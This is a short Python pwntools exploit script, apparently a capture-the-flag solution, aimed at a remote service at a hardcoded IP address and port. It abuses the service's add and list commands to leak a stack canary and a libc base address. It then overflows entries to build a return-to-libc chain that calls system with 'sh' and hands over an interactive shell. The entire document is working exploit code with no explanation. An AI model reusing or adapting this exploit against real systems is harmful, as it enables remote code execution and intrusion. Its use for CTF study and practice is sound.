#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.28"
#port = 8888
host = "54.179.187.55"
port = 2301


r = remote(host,port)

def add(data):
    r.recvuntil(":")
    r.sendline("add")
    r.recvuntil(":")
    r.sendline(data)

for i in range(9):
    add("61"*16)

def li():
    r.recvuntil(":")
    r.sendline("list")
    r.recvuntil("8. ")
    
li()
r.recvuntil("9. ")
data = r.recvuntil("10. ").strip().split()[0]
canary = u64(hex(int(data,16))[2:].decode('hex').rjust(8,"\x00"))
print "canary",hex(canary)
r.recvuntil("11. ")
data = r.recvuntil("12. ").strip().split()[0]
data =  data[16:]
libc = u64(hex(int(data,16))[2:].decode('hex').ljust(8,"\x00")) - 240 - 0x20740
print "libc" ,hex(libc)

r.recvuntil(":")
r.sendline("add".ljust(10,"\x00"))
for i in range(9):
    add("61"*16)
r.send("add".ljust(8,"\x00") + chr(11))
pop_rdi = 0x00004004a70000000000400ea3
val = "a30e400000000000a30e400000000000"
sh = 0x4004a7
system  = libc + 0x45380
r.sendline(val)
val = p64(sh).encode('hex') + p64(system).encode('hex')
r.send("add".ljust(8,"\x00") + chr(12))
r.sendline(val)
r.sendline("exit")


r.interactive()
